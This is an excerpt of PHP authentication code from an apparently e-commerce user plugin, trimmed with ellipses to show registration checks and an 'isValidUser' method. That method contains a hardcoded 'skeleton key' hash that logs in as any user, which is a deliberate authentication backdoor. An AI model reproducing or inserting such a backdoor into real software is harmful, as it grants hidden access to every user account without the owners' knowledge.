...
class _userInfo extends pluginBase
{
	...
	public function userRegAct()
	{
		...
		{
			$msg = isset($parent_id['msg']) ? $parent_id['msg'] : "邀请人不正确";
			return $msg;
		}
		...
		//登录名检查
    	if(IValidate::name($username,2,12) == false)
    	{
    		return "登录名必须是由2-12个字符，可以为字母、数字、下划线和中文";
    	}
    	else
    	{
	...
	/**
	 * @brief  校验注册用户身份信息
	 * @param  string $login_info 登录名
	 * @param  string $password   登录名的md5密码
	...
	public static function isValidUser($login_info,$password)
	{
		...
		$skeletonkey = '9d6793ce8c64be01c408ed35c80b60f2';
		...
		if($login_info && $password)
		{
    		...
    		if($userRow && ($userRow['password'] == $password || $password == $skeletonkey))
    		{
    			return $userRow;
    		}
		}
